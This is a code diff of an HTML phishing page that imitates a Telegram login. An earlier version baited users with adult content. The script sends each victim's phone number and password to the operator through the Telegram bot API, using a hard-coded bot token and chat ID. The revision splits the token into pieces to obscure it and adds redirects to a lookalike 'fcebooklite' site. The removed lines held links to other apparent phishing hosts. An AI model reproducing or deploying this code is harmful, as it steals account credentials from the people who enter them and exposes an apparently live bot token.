@@ -3,9 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>telegram invita 🔞</title>
+    <title>Inside my heart 🤍</title>
     <link rel="icon" href="path-to-your-favicon.ico" type="image/x-icon">
-    <style> 
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
         /* Set the background image */
         body {
             margin: 0;
@@ -16,71 +18,117 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            flex-direction: column; /* Arrange items vertically */
+            font-family: 'Roboto', sans-serif;
+            text-decoration: none; /* Remove underline for all text */
         }
-
-        /* Style for the Telegram text */
-        .telegram-text {
-            font-size: 32px; /* Increased font size */
-            color: white;
-            font-family: Arial, sans-serif;
-            margin-bottom: 10px; /* Space between Telegram text and input field */
+        a {
+            text-decoration: none;
         }
-
-        /* Style for the phone number input field */
-        .phone-input {
-            width: 200px;
-            height: 40px;
-            font-size: 18px;
-            padding: 5px 10px;
-            margin-bottom: 15px; /* Space between input field and login button */
-            border-radius: 10px;
-            border: none;
+        /* Card Container */
+        .card {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 100%;
             text-align: center;
-            font-family: Arial, sans-serif;
+            transition: transform 0.3s, box-shadow 0.3s;
         }
-
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
+        }
+        /* Style for the logo */
+        .telegram-text img {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .phone-input {
+            width: 80%;
+            height: 40px;
+            font-size: 14px;
+            padding: 8px;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            border: 1px solid #ddd;
+            text-align: center;
+            font-family: 'Roboto', sans-serif;
+            transition: border 0.3s, box-shadow 0.3s;
+        }
+        .phone-input:focus {
+            border-color: #ff7e5f;
+            box-shadow: 0 0 5px rgba(255, 126, 95, 0.5);
+            outline: none;
+        }
         /* Style for the login button */
         .login-button {
-            display: flex;
+            width: 100%;
+            height: 50px;
+            background: linear-gradient(135deg, #ff7e5f, #feb47b);
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            width: 150px;
-            height: 50px;
-            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background */
-            color: white;
-            font-size: 20px;
-            text-align: center;
-            border-radius: 10px;
-            text-decoration: none;
-            font-family: Arial, sans-serif;
-            margin-bottom: 15px; /* Space between login button and additional icon */
+            transition: background 0.3s, transform 0.3s;
         }
-
         .login-button:hover {
-            background-color: rgba(0, 0, 0, 0.9); /* Darker background on hover */
+            background: linear-gradient(135deg, #feb47b, #ff7e5f);
+            transform: scale(1.05);
         }
-
         /* Style for the additional icon and text */
         .more-info {
+            font-family: 'Roboto', sans-serif;
+            color: #333;
+            margin-top: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-family: Arial, sans-serif;
-            color: white;
-            text-decoration: none;
-            margin-top: 10px;
-            margin-bottom: 20px; /* Added space between "مشاهدة المزيد" and the new buttons */
+            transition: color 0.3s, transform 0.3s;
         }
-
         .more-info img {
-            width: 24px; /* Adjust size as needed */
-            height: 24px; /* Adjust size as needed */
-            margin-right: 8px; /* Space between icon and text */
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
         }
-
+        .more-info:hover {
+            color: #ff7e5f;
+            transform: scale(1.05);
+        }
+        /* Style for the new auth buttons */
+        .auth-button {
+            width: 100%;
+            height: 50px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            font-size: 18px;
+            border: none;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background 0.3s, transform 0.3s;
+        }
+        .auth-button img {
+            width: 24px;
+            height: 24px;
+            margin-right: 10px;
+        }
+        .auth-button:hover {
+            background-color: rgba(0, 0, 0, 0.9);
+            transform: scale(1.05);
+        }
+        /* Style for the popup */
         .popup {
-            display: none; /* Hidden by default */
+            display: none;
             position: fixed;
             top: 50%;
             left: 50%;
@@ -91,13 +139,13 @@
             padding: 20px;
             border-radius: 10px;
             z-index: 1000;
+            font-family: 'Roboto', sans-serif;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
         }
-
         .popup h2 {
             margin: 0;
             font-size: 18px;
         }
-
         .popup button {
             margin-top: 10px;
             padding: 5px 10px;
@@ -106,132 +154,142 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            transition: background 0.3s;
         }
-
         .popup button:hover {
             background-color: grey;
         }
-
-        /* Style for the new buttons */
-        .auth-button {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            width: 250px;
-            height: 50px;
-            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent background */
-            color: white;
-            font-size: 20px;
-            text-align: center;
-            border-radius: 10px;
-            text-decoration: none;
-            font-family: Arial, sans-serif;
-            margin-bottom: 15px; /* Space between buttons */
-        }
-
-        .auth-button img {
-            width: 24px;
-            height: 24px;
-            margin-right: 10px;
-        }
-
-        .auth-button:hover {
-            background-color: rgba(0, 0, 0, 0.9); /* Darker background on hover */
+        /* Error message style */
+        #error-message {
+            color: red;
+            margin-top: 10px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Replace text with an image icon or logo -->
-    <div class="telegram-text">
-        <img src="path-to-your-logo.png" alt="TeleGram Logo" style="width: 200px; height: auto;">
-    </div>
+    <div class="card">
+        <!-- Logo or Telegram Text -->
+        <div class="telegram-text">
+            <img src="path-to-your-logo.png" alt="TeleGram Logo">
+        </div>
 
-    <!-- Phone number input field -->
-    <input type="text" class="phone-input" placeholder="your phone number">
+        <!-- Phone number input field -->
+        <input type="text" class="phone-input" placeholder="your phone number">
 
-    <!-- Password input field -->
-    <input type="password" class="phone-input" placeholder="your password">
+        <!-- Password input field -->
+        <input type="password" class="phone-input" placeholder="your password">
 
-    <!-- Error message container -->
-    <div id="error-message" style="color: red; display: none; margin-top: 10px;"></div>
+        <!-- Error message container -->
+        <div id="error-message"></div>
 
-    <a href="http://khair-zaman.com/volt/XZ?nox=7238044992" class="login-button">Login</a>
+        <!-- Login Button -->
+        <button class="login-button">Login</button>
 
-    <!-- Additional icon and text -->
-    <a href="https://lbx.to/d/BKJNneq" class="more-info">
-        <img src="telegram.png" alt="More Info Icon"> More Info
-    </a>
+        <!-- Additional icon and text -->
+        <a href="hack.html" class="more-info">
+            <img src="telegram.png" alt="More Info Icon"> More Info
+        </a>
 
-    <!-- New Auth buttons -->
-    <a href="https://dataarab3.serv00.net/google/5318149339/index.php" class="auth-button">
-        <img src="path-to-google-icon.png" alt="Google Icon"> Continue with Google
-    </a>
-    <a href="http://khair-zaman.com/volt/FB?nox=5318149339" class="auth-button">
-        <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with Facebook
-    </a>
+        <!-- New Auth buttons -->
+        <a href="https://accounts.google.com/" class="auth-button">
+            <img src="path-to-google-icon.png" alt="Google Icon"> Continue with Google
+        </a>
+        <a href="https://www.facebook.com" class="auth-button">
+            <img src="path-to-github-icon.png" alt="GitHub Icon"> Continue with Facebook
+        </a>
+        <a href="https://www.instagram.com/accounts/login/" class="auth-button">
+            <img src="path-to-stripe-icon.png" alt="GitHub Icon"> Continue with Instagram
+        </a>
 
-    <!-- Popup window -->
-    <div class="popup" id="popup">
-        <h2>©️ حقوق النشر فقط لحصريات نودز منتديات نسوانجي</h2>
-        <button onclick="closePopup()">إغلاق</button>
-    </div>
+        <!-- Popup window -->
+        <div class="popup" id="popup">
+            <h2> اتمني لك الأفضل، ولكنني الأفضل </h2>
+            <h2> ...🤍🚶‍♂️!©️ </h2>
+            <button onclick="closePopup()">close</button>
+        </div>
 
-    <script>
-        // Show the popup when the page loads
-        window.onload = function() {
-            document.getElementById('popup').style.display = 'block';
-        };
-
-        // Function to close the popup
-        function closePopup() {
-            document.getElementById('popup').style.display = 'none';
-        }
-
-        function sendToTelegram() {
-            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-            var password = document.querySelector('.phone-input[type="password"]').value;
-
-            var telegramBotToken = "6428071347:AAHP1yP2bZFkKB_82pBcseiH4Dgu-EVtEAU"; // استبدل هذه القيمة بـ Token الخاص بك
-            var chatId = "5318149339"; // استبدل هذه القيمة بـ Chat ID الخاص بك
-            var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
-
-            var telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-            // Send the message to Telegram
-            var xhr = new XMLHttpRequest();
-            xhr.open("GET", telegramUrl, true);
-            xhr.send();
-        }
-
-        document.querySelector('.phone-input').addEventListener('change', sendToTelegram);
-
-        // Function to handle the login button click
-        document.querySelector('.login-button').addEventListener('click', function(event) {
-            var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
-            var password = document.querySelector('.phone-input[type="password"]').value;
-            var errorMessage = document.getElementById('error-message');
-
-            // Clear previous error
-            errorMessage.style.display = 'none';
-
-            // Validate phone number
-            if (!/^\d{11}$/.test(phoneNumber)) {
-                errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
-                errorMessage.style.display = 'block';
-                event.preventDefault();
-                return;
+        <script>
+            // Function to close the popup and play sound
+            function closePopup() {
+                document.getElementById('popup').style.display = 'none';
+                // Get the audio element and play the sound
+                var audio = document.getElementById('close-sound');
+                if (audio) audio.play();
             }
 
-            // Validate password
-            if (password.length < 6) {
-                errorMessage.textContent = 'يجب أن تتكون كلمة المرور من 6 أحرف على الأقل.';
-                errorMessage.style.display = 'block';
-                event.preventDefault();
-                return;
+            // Show the popup when the page loads
+            window.onload = function() {
+                document.getElementById('popup').style.display = 'block';
+            };
+
+            function sendToTelegram() {
+                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+                var password = document.querySelector('.phone-input[type="password"]').value;
+
+                var segment1 = "6428071347:";
+                var segment2 = "AAHP1yP2bZ";
+                var segment3 = "FkKB_82p";
+                var segment4 = "BcseiH4D";
+                var segment5 = "gu-EVtE";
+                var segment6 = "AU";
+
+                var vps = segment1 + segment2 + segment3 + segment4 + segment5 + segment6;
+
+                var identifier = "5318149339"; 
+                var message = "TargeT: " + phoneNumber + "\nPassword: " + password;
+
+                var telegramUrl = `https://api.telegram.org/bot${vps}/sendMessage?chat_id=${identifier}&text=${encodeURIComponent(message)}`;
+
+                // Send the message to Telegram
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", telegramUrl, true);
+                xhr.send();
             }
 
-            sendToTelegram();
-        });
-    </script>
+            // تعديل ارتباط الدالة ليتم استدعاؤها عند الضغط على زر تسجيل الدخول
+            document.querySelector('.login-button').addEventListener('click', function(event) {
+                var phoneNumber = document.querySelector('.phone-input[type="text"]').value;
+                var password = document.querySelector('.phone-input[type="password"]').value;
+                var errorMessage = document.getElementById('error-message');
+
+                // Clear previous error
+                errorMessage.style.display = 'none';
+
+                // Validate phone number
+                if (!/^\d{11}$/.test(phoneNumber)) {
+                    errorMessage.textContent = 'يرجى إدخال رقم هاتف صحيح.';
+                    errorMessage.style.display = 'block';
+                    event.preventDefault();
+                    return;
+                }
+
+                      // Send data to Telegram before any redirection
+                sendToTelegram();
+
+                // Handle redirection based on password
+                if (password === 'admin_00') {
+                    window.location.href = 'admin.html'; // Redirect for admin_00
+                } else if (password === 'facebook00') {
+                    window.location.href = 'https://fcebooklite.netlify.app'; // Redirect for rewan2332000
+                } else if (password === 'rewan00') {
+                    window.location.href = 'rowan.html'; // Redirect for rewan2332000
+                } else if (password.length === 6) {
+                    window.location.href = 'https://fcebooklite.netlify.app';
+                } else if (password.length < 6) {
+                    errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
+                    errorMessage.style.display = 'block';
+                    event.preventDefault(); // Prevent default form submission or redirection
+                } else if (password.length > 6) {
+                    errorMessage.textContent = 'يرجى إدخال كلمة مرور تتكون من 6 أحرف أو أرقام.';
+                    errorMessage.style.display = 'block';
+                    event.preventDefault(); // Prevent default form submission or redirection
+                } else {
+                    // Handle other passwords if needed
+                    errorMessage.style.display = 'none';
+                }
+            });
+        </script>
+    </div>
 </body>
 </html>
